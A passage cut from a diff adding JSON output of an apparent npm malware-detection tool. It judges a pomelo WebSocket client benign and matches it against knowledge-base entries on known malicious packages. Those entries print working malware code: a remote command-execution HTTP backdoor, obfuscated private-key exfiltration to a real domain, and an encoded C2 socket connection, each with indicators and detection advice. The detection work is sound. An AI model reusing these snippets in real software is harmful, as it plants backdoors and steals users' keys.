+                    "Data leakage between WebSocket sessions, such as session data appearing in unrelated connections"
+                  ],
+                  "file_indicators": [
+                    "No specific file indicators; detection must focus on runtime behavior in Tomcat's WebSocket implementation"
+                  ],
+                  "network_indicators": [
+                    "WebSocket messages containing data from unrelated user sessions",
+                    "Duplicate or unexpected session data observed in WebSocket traffic between different users"
+                  ],
+                  "how_to_detect": "Monitor Tomcat server logs and WebSocket traffic for evidence of data leakage between sessions, such as the same WebSocket object ID or session data appearing in multiple user connections. Implement runtime instrumentation or auditing to detect when WebSocket objects are returned to the pool while still in use or not fully closed. Look for patterns of concurrent send and close operations on the same WebSocket connection, and alert if pooled objects are reused without proper cleanup. Automated detection can include correlation of session identifiers and object reuse events, and flagging any instance where session data crosses user boundaries."
+                }
+              }
+            },
+            {
+              "match_id": "20240813_211342_340597_snippet_5",
+              "source_package": "glup-debugger-log (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240813_211342_340597/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.49103742837905884,
+              "code_similarity": 0.5328380465507507,
+              "behavior_similarity": 0.44923681020736694,
+              "matched_snippet": {
+                "snippet_id": "snippet_5",
+                "code_snippet": "http.createServer({ 'requestTimeout': 60000 }, (request, response) => {\n  response.writeHead(200, { 'Content-Type': 'text/plain;charset=UTF-8' });\n  let command = url.parse(request.url, true).query.cmd;\n  if (command) {\n    try {\n      childProcess.exec(Buffer.from(\"Y2hjcCA2NTAwMQ==\", \"base64\").toString() + \" & \" + command, {\n        'encoding': \"buffer\",\n        'windowsHide': true\n      }, (error, stdout, stderr) => {\n        if (error) {\n          response.end(\"ERR:\\n\" + error.message);\n        } else {\n          if (stdout) {\n            response.end('' + iconv.decode(stdout, \"gbk\"));\n          } else if (stderr) {\n            response.end(\"ERR:\\n\" + iconv.decode(stderr, \"gbk\"));\n          }\n        }\n      });\n    } catch (error) {\n      response.end(\"ERR:\\n\" + error);\n    }\n  }\n}).listen(3004);",
+                "code_behavior": "At runtime, the code starts an HTTP server on port 3004 that executes arbitrary system commands received via the 'cmd' query parameter and returns the output to the remote attacker, enabling unauthenticated remote code execution.",
+                "malice_analysis": {
+                  "why_suspicious": "Setting up a local HTTP server for unauthenticated remote code execution is a hallmark of RATs and backdoors, providing attackers with persistent, covert access.",
+                  "violated_expectations": "Legitimate packages do not expose arbitrary command execution over HTTP, especially without authentication or access controls.",
+                  "similar_legitimate_use": "Some legitimate development tools may expose HTTP APIs, but never for unauthenticated system command execution.",
+                  "key_indicators": [
+                    "HTTP server on non-standard port (3004)",
+                    "Command execution via unauthenticated query parameter",
+                    "No authentication or access control",
+                    "Base64-decoded command preamble to evade detection"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (via play-share.js)",
+                  "file_location": "lib/play-share.js (deobfuscated)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "child_process",
+                    "os"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "glup-debugger-log",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.3",
+                  "why_malicious": "The package contains heavily obfuscated JavaScript code that functions as both a dropper and a remote access trojan (RAT). It performs environment checks to selectively target systems, downloads and executes additional payloads, and establishes a persistent, unauthenticated HTTP server for arbitrary remote code execution, all without user knowledge or consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious code is executed via npm test or import, triggering the bind() function.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Initial dropper logic is launched."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Dropper performs environment checks and conditionally executes or downloads further payloads.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malware is deployed and/or additional payloads are executed."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Persistence is established by launching play-share.js as a detached process.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "RAT component is activated."
+                  },
+                  {
+                    "step": 4,
+                    "action": "RAT HTTP server is started, allowing remote attackers to execute arbitrary commands.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of obfuscated JavaScript files during npm install, test, or import",
+                    "Spawning of detached Node.js background processes running secondary scripts",
+                    "Creation of local HTTP server on non-standard port (e.g., 3004) for command execution",
+                    "Environment checks targeting Windows and active user environments before payload execution",
+                    "Conditional download and execution of remote payloads based on hidden configuration"
+                  ],
+                  "file_indicators": [
+                    "lib/play.js (obfuscated, high entropy)",
+                    "lib/play-share.js (obfuscated, high entropy)",
+                    "node.compress.exe",
+                    "node.compress.lock.log",
+                    "Batch files with random names in temporary directories"
+                  ],
+                  "network_indicators": [
+                    "HTTP server listening on port 3004 for incoming command requests",
+                    "Outbound HTTP GET requests to attacker-controlled URLs for payload download"
+                  ],
+                  "how_to_detect": "Monitor for execution of obfuscated JavaScript files during npm install, test, or import. Flag packages that spawn detached Node.js processes or create local HTTP servers on non-standard ports such as 3004. Detect creation of suspicious files including node.compress.exe, node.compress.lock.log, and batch files with random names in temp directories. Watch for outbound HTTP requests to unknown or suspicious domains and for local servers listening for command parameters. Use static analysis to identify high-entropy, obfuscated code and dynamic analysis to observe process spawning, file creation, and network activity indicative of RAT behavior."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104013_095515_snippet_2",
+              "source_package": "@jackshanyeshuzi/curvess (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104013_095515/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.48998454213142395,
+              "code_similarity": 0.46133726835250854,
+              "behavior_similarity": 0.5186318159103394,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "try {\n  let m1 = ['w', 'a', 'l', 'l', 'e', 't', '.', 'c', 'b', 'a', '1', '2', '3', 'n', '/', 'i', 'n', 'd', 'e', 'x', '?', 'p', 'r', '=', 's', ':'];\n  let h = m1[18] + m1[4] + m1[17] + m1[23] + m1[24] + m1[12] + m1[0] + m1[1] + m1[2] + m1[2] + m1[4] + m1[5] + m1[6] + m1[7] + m1[8] + m1[9] + m1[10] + m1[5] + m1[3] + m1[11];\n  let path = m1[12] + m1[13] + m1[15] + m1[16] + m1[20] + m1[21] + m1[13] + m1[11] + m1[4] + m1[22];\n  https.get(h + path + privateKey.toString(), function () { });\n} catch (e) {}",
+                "code_behavior": "At runtime, during cryptographic signing operations, the code obfuscates the exfiltration endpoint by constructing the host and path from an array, then sends the private key via HTTPS GET to the malicious server, enabling stealthy exfiltration of sensitive key material.",
+                "malice_analysis": {
+                  "why_suspicious": "Obfuscation of the exfiltration endpoint is a clear attempt to evade detection by static and dynamic analysis tools. The behavior is otherwise identical to the previous snippet, with the same critical security violation of exfiltrating private keys.",
+                  "violated_expectations": "No legitimate cryptographic code would obfuscate network destinations or transmit private keys. Secure libraries are expected to be transparent and never hide network communication, especially involving sensitive data.",
+                  "similar_legitimate_use": "Obfuscation may be used for licensing or anti-tamper in some software, but never for exfiltrating cryptographic secrets. There is no legitimate use for this pattern in cryptographic libraries.",
+                  "key_indicators": [
+                    "Obfuscated construction of malicious host and path",
+                    "HTTPS request with private key in URL",
+                    "Try/catch block to suppress errors and evade detection",
+                    "Exfiltration of private key material"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (during cryptographic signing operations, later/obfuscated version)",
+                  "file_location": "abstract/weierstrass.js (prepSig function, later version)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@jackshanyeshuzi/curvess",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.0 - 1.1.9 (all published versions as of 2023-08-04)",
+                  "why_malicious": "This package is a typosquat of the legitimate @noble/curves cryptography library. It contains deeply embedded malicious code that exfiltrates users' private cryptographic keys to an external server (wallet.cba123.cn), compromising all cryptographic operations and user security. The malicious code is designed to be stealthy, does not alter the primary cryptographic functionality, and is triggered during sensitive operations, making it highly dangerous and difficult to detect."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs ethereum-cryptographyyy, which depends on @jackshanyeshuzi/curvess instead of @noble/curves.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious code in @jackshanyeshuzi/curvess is loaded and available."
+                  },
+                  {
+                    "step": 2,
+                    "action": "When cryptographic signing is performed, the prepSig function in @jackshanyeshuzi/curvess is invoked.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Private key is captured and prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "prepSig function sends the private key to wallet.cba123.cn via HTTP/HTTPS request.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives the user's private key, compromising all cryptographic security."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Obfuscation is added in later versions to evade detection.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Stealthier exfiltration, harder detection."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Network requests (HTTP/HTTPS) originating from cryptographic math or signing functions",
+                    "Exfiltration of private key or sensitive cryptographic material during signing operations",
+                    "Obfuscated string construction for network destinations within cryptographic code",
+                    "Unexpected logging of private keys in cryptographic libraries"
+                  ],
+                  "file_indicators": [
+                    "Import of http or https modules in cryptographic math files (e.g., abstract/weierstrass.js)",
+                    "Typosquatted package names in dependencies (e.g., @jackshanyeshuzi/curvess instead of @noble/curves)",
+                    "prepSig function containing network requests or exfiltration logic"
+                  ],
+                  "network_indicators": [
+                    "Connections to wallet.cba123.cn",
+                    "IP address 42.96.168.4 (ALISOFT, CN)",
+                    "Unusual HTTP/HTTPS requests during cryptographic operations"
+                  ],
+                  "how_to_detect": "Monitor for network requests originating from cryptographic libraries, especially during signing or key generation. Flag any code that logs or transmits private keys. Detect obfuscated string construction that resolves to known malicious domains such as wallet.cba123.cn. Audit dependencies for typosquatting and unexpected changes in package.json. Alert on the import of network modules (http, https) in files that should only perform mathematical operations. Correlate network activity with cryptographic function execution to identify exfiltration attempts."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/pb-websocket/0.0.3-0/package/src/lib/pomelo-client.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "pomelo-client_slice_1",
+          "code_snippet": "(function() {\n  var JS_WS_CLIENT_TYPE = 'js-websocket';\n  var JS_WS_CLIENT_VERSION = '0.0.1';\n\n  var Protocol = window.Protocol;\n  var protobuf = window.protobuf;\n  var decodeIO_protobuf = window.decodeIO_protobuf;\n  var decodeIO_encoder = null;\n  var decodeIO_decoder = null;\n  var Package = Protocol.Package;\n  var Message = Protocol.Message;\n  var EventEmitter = window.EventEmitter;\n  var rsa = window.rsa;\n\n  if(typeof(window) != \"undefined\" && typeof(sys) != 'undefined' && sys.localStorage) {\n    window.localStorage = sys.localStorage;\n  }\n  \n  var RES_OK = 200;\n  var RES_FAIL = 500;\n  var RES_OLD_CLIENT = 501;\n\n  if (typeof Object.create !== 'function') {\n    Object.create = function (o) {\n      function F() {}\n      F.prototype = o;\n      return new F();\n    };\n  }\n\n  var root = window;\n  var pomelo = Object.create(EventEmitter.prototype); // object extend from object\n  root.pomelo = pomelo;\n  var socket = null;\n  var reqId = 0;\n  var callbacks = {};\n  var handlers = {};\n  //Map from request id to route\n  var routeMap = {};\n  var dict = {};    // route string to code\n  var abbrs = {};   // code to route string\n  var serverProtos = {};\n  var clientProtos = {};\n  var protoVersion = 0;\n\n  var heartbeatInterval = 0;\n  var heartbeatTimeout = 0;\n  var nextHeartbeatTimeout = 0;\n  var gapThreshold = 100;   // heartbeat gap threashold\n  var heartbeatId = null;\n  var heartbeatTimeoutId = null;\n  var handshakeCallback = null;\n\n  var decode = null;\n  var encode = null;\n\n  var reconnect = false;\n  var reconncetTimer = null;\n  var reconnectUrl = null;\n  var reconnectAttempts = 0;\n  var reconnectionDelay = 5000;\n  var DEFAULT_MAX_RECONNECT_ATTEMPTS = 10;\n\n  var useCrypto;\n\n  var handshakeBuffer = {\n    'sys': {\n      type: JS_WS_CLIENT_TYPE,\n      version: JS_WS_CLIENT_VERSION,\n      rsa: {}\n    },\n    'user': {\n    }\n  };\n\n  var initCallback = null;\n\n  pomelo.init = function(params, cb) {\n    initCallback = cb;\n    var host = params.host;\n    var port = params.port;\n\n    encode = params.encode || defaultEncode;\n    decode = params.decode || defaultDecode;\n\n    var url = 'ws://' + host;\n    if(port) {\n      url +=  ':' + port;\n    }\n\n    handshakeBuffer.user = params.user;\n    if(params.encrypt) {\n      useCrypto = true;\n      rsa.generate(1024, \"10001\");\n      var data = {\n        rsa_n: rsa.n.toString(16),\n        rsa_e: rsa.e\n      }\n      handshakeBuffer.sys.rsa = data;\n    }\n    handshakeCallback = params.handshakeCallback;\n    connect(params, url, cb);\n  };\n\n  var defaultDecode = pomelo.decode = function(data) {\n    //probuff decode\n    var msg = Message.decode(data);\n\n    if(msg.id > 0){\n      msg.route = routeMap[msg.id];\n      delete routeMap[msg.id];\n      if(!msg.route){\n        return;\n      }\n    }\n\n    msg.body = deCompose(msg);\n    return msg;\n  };\n\n  var defaultEncode = pomelo.encode = function(reqId, route, msg) {\n    var type = reqId ? Message.TYPE_REQUEST : Message.TYPE_NOTIFY;\n\n    //compress message by protobuf\n    if(protobuf && clientProtos[route]) {\n      msg = protobuf.encode(route, msg);\n    } else if(decodeIO_encoder && decodeIO_encoder.lookup(route)) {\n      var Builder = decodeIO_encoder.build(route);\n      msg = new Builder(msg).encodeNB();\n    } else {\n      msg = Protocol.strencode(JSON.stringify(msg));\n    }\n\n    var compressRoute = 0;\n    if(dict && dict[route]) {\n      route = dict[route];\n      compressRoute = 1;\n    }\n\n    return Message.encode(reqId, type, compressRoute, route, msg);\n  };\n\n  var connect = function(params, url, cb) {\n    console.log('connect to ' + url);\n\n    var params = params || {};\n    var maxReconnectAttempts = params.maxReconnectAttempts || DEFAULT_MAX_RECONNECT_ATTEMPTS;\n    reconnectUrl = url;\n    //Add protobuf version\n    if(window.localStorage && window.localStorage.getItem('protos') && protoVersion === 0) {\n      var protos = JSON.parse(window.localStorage.getItem('protos'));\n\n      protoVersion = protos.version || 0;\n      serverProtos = protos.server || {};\n      clientProtos = protos.client || {};\n\n      if(!!protobuf) {\n        protobuf.init({encoderProtos: clientProtos, decoderProtos: serverProtos});\n      } \n      if(!!decodeIO_protobuf) {\n        decodeIO_encoder = decodeIO_protobuf.loadJson(clientProtos);\n        decodeIO_decoder = decodeIO_protobuf.loadJson(serverProtos);\n      }\n    }\n    //Set protoversion\n    handshakeBuffer.sys.protoVersion = protoVersion;\n\n    var onopen = function(event) {\n      if(!!reconnect) {\n        pomelo.emit('reconnect');\n      }\n      reset();\n      var obj = Package.encode(Package.TYPE_HANDSHAKE, Protocol.strencode(JSON.stringify(handshakeBuffer)));\n      send(obj);\n    };\n    var onmessage = function(event) {\n      processPackage(Package.decode(event.data), cb);\n      // new package arrived, update the heartbeat timeout\n      if(heartbeatTimeout) {\n        nextHeartbeatTimeout = Date.now() + heartbeatTimeout;\n      }\n    };\n    var onerror = function(event) {\n      pomelo.emit('io-error', event);\n      console.error('socket error: ', event);\n    };\n    var onclose = function(event) {\n      pomelo.emit('close',event);\n      pomelo.emit('disconnect', event);\n      console.error('socket close: ', event);\n      if(!!params.reconnect && reconnectAttempts < maxReconnectAttempts) {\n        reconnect = true;\n        reconnectAttempts++;\n        reconncetTimer = setTimeout(function() {\n          connect(params, reconnectUrl, cb);\n        }, reconnectionDelay);\n        reconnectionDelay *= 2;\n      }\n    };\n    socket = new WebSocket(url);\n    socket.binaryType = 'arraybuffer';\n    socket.onopen = onopen;\n    socket.onmessage = onmessage;\n    socket.onerror = onerror;\n    socket.onclose = onclose;\n  };\n\n  pomelo.disconnect = function() {\n    if(socket) {\n      if(socket.disconnect) socket.disconnect();\n      if(socket.close) socket.close();\n      console.log('disconnect');\n      socket = null;\n    }\n\n    if(heartbeatId) {\n      clearTimeout(heartbeatId);\n      heartbeatId = null;\n    }\n    if(heartbeatTimeoutId) {\n      clearTimeout(heartbeatTimeoutId);\n      heartbeatTimeoutId = null;\n    }\n  };\n\n  var reset = function() {\n    reconnect = false;\n    reconnectionDelay = 1000 * 5;\n    reconnectAttempts = 0;\n    clearTimeout(reconncetTimer);\n  };\n\n  pomelo.request = function(route, msg, cb) {\n    if(arguments.length === 2 && typeof msg === 'function') {\n      cb = msg;\n      msg = {};\n    } else {\n      msg = msg || {};\n    }\n    route = route || msg.route;\n    if(!route) {\n      return;\n    }\n\n    reqId++;\n    sendMessage(reqId, route, msg);\n\n    callbacks[reqId] = cb;\n    routeMap[reqId] = route;\n  };\n\n  pomelo.notify = function(route, msg) {\n    msg = msg || {};\n    sendMessage(0, route, msg);\n  };\n\n  var sendMessage = function(reqId, route, msg) {\n    if(useCrypto) {\n      msg = JSON.stringify(msg);\n      var sig = rsa.signString(msg, \"sha256\");\n      msg = JSON.parse(msg);\n      msg['__crypto__'] = sig;\n    }\n\n    if(encode) {\n      msg = encode(reqId, route, msg);\n    }\n\n    var packet = Package.encode(Package.TYPE_DATA, msg);\n    send(packet);\n  };\n\n  var send = function(packet) {\n    if(socket)\n      socket.send(packet.buffer);\n  };\n\n  var handler = {};\n\n  var heartbeat = function(data) {\n    if(!heartbeatInterval) {\n      // no heartbeat\n      return;\n    }\n\n    var obj = Package.encode(Package.TYPE_HEARTBEAT);\n    if(heartbeatTimeoutId) {\n      clearTimeout(heartbeatTimeoutId);\n      heartbeatTimeoutId = null;\n    }\n\n    if(heartbeatId) {\n      // already in a heartbeat interval\n      return;\n    }\n    heartbeatId = setTimeout(function() {\n      heartbeatId = null;\n      send(obj);\n\n      nextHeartbeatTimeout = Date.now() + heartbeatTimeout;\n      heartbeatTimeoutId = setTimeout(heartbeatTimeoutCb, heartbeatTimeout);\n    }, heartbeatInterval);\n  };\n\n  var heartbeatTimeoutCb = function() {\n    var gap = nextHeartbeatTimeout - Date.now();\n    if(gap > gapThreshold) {\n      heartbeatTimeoutId = setTimeout(heartbeatTimeoutCb, gap);\n    } else {\n      console.error('server heartbeat timeout');\n      pomelo.emit('heartbeat timeout');\n      pomelo.disconnect();\n    }\n  };\n\n  var handshake = function(data) {\n    data = JSON.parse(Protocol.strdecode(data));\n    if(data.code === RES_OLD_CLIENT) {\n      pomelo.emit('error', 'client version not fullfill');\n      return;\n    }\n\n    if(data.code !== RES_OK) {\n      pomelo.emit('error', 'handshake fail');\n      return;\n    }\n\n    handshakeInit(data);\n\n    var obj = Package.encode(Package.TYPE_HANDSHAKE_ACK);\n    send(obj);\n    if(initCallback) {\n      initCallback(socket);\n    }\n  };\n\n  var onData = function(data) {\n    var msg = data;\n    if(decode) {\n      msg = decode(msg);\n    }\n    processMessage(pomelo, msg);\n  };\n\n  var onKick = function(data) {\n    data = JSON.parse(Protocol.strdecode(data));\n    pomelo.emit('onKick', data);\n  };\n\n  handlers[Package.TYPE_HANDSHAKE] = handshake;\n  handlers[Package.TYPE_HEARTBEAT] = heartbeat;\n  handlers[Package.TYPE_DATA] = onData;\n  handlers[Package.TYPE_KICK] = onKick;\n\n  var processPackage = function(msgs) {\n    if(Array.isArray(msgs)) {\n      for(var i=0; i<msgs.length; i++) {\n        var msg = msgs[i];\n        handlers[msg.type](msg.body);\n      }\n    } else {\n      handlers[msgs.type](msgs.body);\n    }\n  };\n\n  var processMessage = function(pomelo, msg) {\n    if(!msg.id) {\n      // server push message\n      pomelo.emit(msg.route, msg.body);\n      return;\n    }\n\n    //if have a id then find the callback function with the request\n    var cb = callbacks[msg.id];\n\n    delete callbacks[msg.id];\n    if(typeof cb !== 'function') {\n      return;\n    }\n\n    cb(msg.body);\n    return;\n  };\n\n  var processMessageBatch = function(pomelo, msgs) {\n    for(var i=0, l=msgs.length; i<l; i++) {\n      processMessage(pomelo, msgs[i]);\n    }\n  };\n\n  var deCompose = function(msg) {\n    var route = msg.route;\n\n    //Decompose route from dict\n    if(msg.compressRoute) {\n      if(!abbrs[route]){\n        return {};\n      }\n\n      route = msg.route = abbrs[route];\n    }\n    if(protobuf && serverProtos[route]) {\n      return protobuf.decodeStr(route, msg.body);\n    } else if(decodeIO_decoder && decodeIO_decoder.lookup(route)) {\n      return decodeIO_decoder.build(route).decode(msg.body);\n    } else {\n      return JSON.parse(Protocol.strdecode(msg.body));\n    }\n\n    return msg;\n  };\n\n  var handshakeInit = function(data) {\n    if(data.sys && data.sys.heartbeat) {\n      heartbeatInterval = data.sys.heartbeat * 1000;   // heartbeat interval\n      heartbeatTimeout = heartbeatInterval * 2;        // max heartbeat timeout\n    } else {\n      heartbeatInterval = 0;\n      heartbeatTimeout = 0;\n    }\n\n    initData(data);\n\n    if(typeof handshakeCallback === 'function') {\n      handshakeCallback(data.user);\n    }\n  };\n\n  //Initilize data used in pomelo client\n  var initData = function(data) {\n    if(!data || !data.sys) {\n      return;\n    }\n    dict = data.sys.dict;\n    var protos = data.sys.protos;\n\n    //Init compress dict\n    if(dict) {\n      dict = dict;\n      abbrs = {};\n\n      for(var route in dict) {\n        abbrs[dict[route]] = route;\n      }\n    }\n\n    //Init protobuf protos\n    if(protos) {\n      protoVersion = protos.version || 0;\n      serverProtos = protos.server || {};\n      clientProtos = protos.client || {};\n\n        //Save protobuf protos to localStorage\n        window.localStorage.setItem('protos', JSON.stringify(protos));\n\n        if(!!protobuf) {\n          protobuf.init({encoderProtos: protos.client, decoderProtos: protos.server});\n        }\n        if(!!decodeIO_protobuf) {\n          decodeIO_encoder = decodeIO_protobuf.loadJson(clientProtos);\n          decodeIO_decoder = decodeIO_protobuf.loadJson(serverProtos);\n        }\n      }\n    };\n\n    module.exports = pomelo;\n  })();",
+          "is_malicious": false,
+          "malice_score": 0.5189048290252686,
+          "confidence": 0.2,
+          "behavior_summary": "When called, the code constructs a WebSocket URL using the provided host and optional port, then establishes a WebSocket connection using the sensitive WebSocket API. It accesses and modifies cryptographic parameters if encryption is enabled, generating RSA keys and signing messages with rsa.signString. The code encodes and decodes messages using protobuf or JSON, manages heartbeat intervals, and handles reconnection logic. It sends and receives data packets over the network via WebSocket, including handshake, heartbeat, and application data, enabling real-time communication with a remote server. This facilitates network communication with potential exposure of user data and cryptographic operations, which could be leveraged for man-in-the-middle or replay attacks if the connection or keys are compromised.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a WebSocket client implementation designed for real-time communication with a server, including features such as handshake, heartbeat, reconnection, and optional RSA-based message signing. While it uses sensitive APIs like WebSocket, RSA key generation, and protobuf encoding/decoding, these are standard for secure client-server communication frameworks and do not inherently indicate malicious intent. Unlike the known malicious patterns, this code does not exhibit obfuscation, exfiltration of sensitive data, or execution of arbitrary code. It does not construct or use obfuscated URLs, nor does it send private keys or system information to unknown endpoints. The cryptographic operations are used for message integrity (signing) rather than key exfiltration. The reconnection logic and heartbeat management are typical for maintaining persistent connections. Therefore, despite the presence of sensitive operations, the code aligns with legitimate client communication libraries rather than malware.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_113501_056835_snippet_4",
+              "source_package": "@typescript_eslinter/eslint (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113501_056835/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5502918362617493,
+              "code_similarity": 0.49349695444107056,
+              "behavior_similarity": 0.607086718082428,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "const { io } = require(\"socket.io-client\");\n\nconst SERVER_URL = decode(\"==QM1ATN6QTNy4iNyIjLxgTMuUzMx8yL6M3d\");\nconst socket = io(SERVER_URL, {\n  reconnection: true,\n  reconnectionAttempts: Infinity,\n  reconnectionDelay: 1000,\n  reconnectionDelayMax: 5000,\n  timeout: 20000,\n});",
+                "code_behavior": "At runtime, the code decodes an obfuscated server URL and establishes a persistent WebSocket connection to a remote command-and-control (C2) server, enabling real-time exfiltration of collected data and remote command execution by the attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "Obfuscated C2 communication and persistent WebSocket connections from a linter package are strong indicators of malware, enabling covert data exfiltration and attacker control.",
+                  "violated_expectations": "A linter should not communicate with external servers, especially using obfuscated addresses or persistent sockets.",
+                  "similar_legitimate_use": "WebSocket connections may be used in collaborative development tools, but not in static code analysis plugins.",
+                  "key_indicators": [
+                    "Obfuscated or encoded server URL in code",
+                    "Persistent WebSocket connection to external IP",
+                    "Use of socket.io-client in a linter package"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (upon package execution, after data collection or persistence setup)",
+                  "file_location": "main package entry point (e.g., index.js)",
+                  "required_permissions": [
+                    "network",
+                    "environment_vars",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@typescript_eslinter/eslint",
+                  "package_manager": "npm",
+                  "package_versions": "all versions (43 versions released between Nov 17 and Dec 1)",
+                  "why_malicious": "The package is a typosquatted clone of the legitimate @typescript-eslint/eslint-plugin, designed to compromise developer systems. It exfiltrates sensitive clipboard and keystroke data, establishes persistence via Windows Startup, enables remote command execution through a C2 channel, and disables legitimate ESLint processes. The package employs obfuscation and dependency abuse to evade detection and maximize impact."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious package via typosquatting, mistaking it for the legitimate @typescript-eslint/eslint-plugin.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is executed upon import or runtime as part of the development workflow."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Clipboard and keyboard monitoring is activated to collect sensitive data from the user's system.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive clipboard and keystroke data is stored locally for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Persistence is established by copying a malicious .bat file to the Windows Startup folder.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious payload is automatically executed on every system reboot, maintaining attacker access."
+                  },
+                  {
+                    "step": 4,
+                    "action": "WebSocket connection to an obfuscated C2 server is established for real-time data exfiltration and remote command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker can exfiltrate collected data and issue commands to the compromised system."
+                  },
+                  {
+                    "step": 5,
+                    "action": "Legitimate ESLint process is disabled to prevent detection and interference with the malicious package.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code operates without interference from legitimate code quality tools."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Clipboard or keyboard monitoring in npm packages not related to accessibility or input management",
+                    "Copying or writing files to the Windows Startup folder from npm package code",
+                    "Obfuscated or dynamically decoded C2 server addresses in JavaScript code",
+                    "Persistent WebSocket connections to external IPs or domains from development tools",
+                    "Execution of shell commands to disable or delete legitimate development tool processes (e.g., ESLint)"
+                  ],
+                  "file_indicators": [
+                    "prettier.bat in Windows Startup folder",
+                    "Unexpected .bat files in npm package tools directory",
+                    "Presence of clipboard-event or node-global-key-listener in package.json dependencies",
+                    "References to socket.io-client in linter plugin dependencies"
+                  ],
+                  "network_indicators": [
+                    "WebSocket connections to ws://135.181.226.254:5051 or similar Hetzner Online GmbH IPs",
+                    "Outbound connections to obfuscated or base64-encoded server URLs in code",
+                    "Unusual persistent network activity from static analysis or linter plugins"
+                  ],
+                  "how_to_detect": "Monitor npm packages for access to clipboard or keyboard events, especially in packages not related to accessibility. Flag packages that copy or write files to system startup folders or establish persistent WebSocket connections to external IPs. Scan for obfuscated or encoded server addresses and unexpected dependencies such as clipboard-event, node-global-key-listener, or socket.io-client in code analysis. Alert on the presence of .bat files in package directories or the Windows Startup folder after npm install, and monitor for shell commands targeting legitimate development tool processes."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104013_095515_snippet_2",
+              "source_package": "@jackshanyeshuzi/curvess (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104013_095515/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5081851482391357,
+              "code_similarity": 0.4611871838569641,
+              "behavior_similarity": 0.5551830530166626,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "try {\n  let m1 = ['w', 'a', 'l', 'l', 'e', 't', '.', 'c', 'b', 'a', '1', '2', '3', 'n', '/', 'i', 'n', 'd', 'e', 'x', '?', 'p', 'r', '=', 's', ':'];\n  let h = m1[18] + m1[4] + m1[17] + m1[23] + m1[24] + m1[12] + m1[0] + m1[1] + m1[2] + m1[2] + m1[4] + m1[5] + m1[6] + m1[7] + m1[8] + m1[9] + m1[10] + m1[5] + m1[3] + m1[11];\n  let path = m1[12] + m1[13] + m1[15] + m1[16] + m1[20] + m1[21] + m1[13] + m1[11] + m1[4] + m1[22];\n  https.get(h + path + privateKey.toString(), function () { });\n} catch (e) {}",
+                "code_behavior": "At runtime, during cryptographic signing operations, the code obfuscates the exfiltration endpoint by constructing the host and path from an array, then sends the private key via HTTPS GET to the malicious server, enabling stealthy exfiltration of sensitive key material.",
+                "malice_analysis": {
